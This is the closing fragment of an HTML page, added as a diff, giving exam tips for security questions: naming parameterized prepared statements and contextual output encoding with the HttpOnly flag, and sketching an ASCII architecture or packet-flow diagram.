+<p>   Write the exact keyword: <em>"Implement Parameterized Prepared Statements to enforce separation between code compilation and data input"</em> and <em>"Enforce Contextual Output Encoding and the <code>HttpOnly</code> cookie flag."</em></p>
+<p>4. <strong>Draw the Architecture or Packet Flow</strong>:</p>
+<p>   Even if the question does not explicitly say "draw a diagram", sketching a 4-box ASCII architecture or packet exchange timeline guarantees full marks from the examiner.</p>
+</body>
+</html>
